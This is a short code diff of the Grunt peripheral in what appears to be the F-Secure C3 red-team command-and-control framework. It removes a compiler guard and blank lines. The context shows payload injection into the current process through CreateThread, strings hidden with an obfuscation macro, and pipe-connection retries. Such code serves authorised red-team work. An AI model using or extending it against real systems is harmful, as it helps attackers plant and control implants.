@@ -1,9 +1,4 @@
 #include "StdAfx.h"
-
-#if defined (__clang__)
-#warning("Compilation of Grunt peripheral is only supported with MSVC")
-#elif defined (_MSC_VER)
-
 #include "Grunt.h"
 
 FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
@@ -28,8 +23,6 @@ FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 	// Inject the payload stage into the current process.
 	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), m_BeaconStager.Get(), 0, nullptr))
 		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
-
-	
 
 	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give Grunt thread time to start pipe.
 	for (auto i = 0u; i < connectAttempts; i++)
@@ -138,5 +131,3 @@ FSecure::ByteView FSecure::C3::Interfaces::Peripherals::Grunt::GetCapability()
 }
 )";
 }
-
-#endif
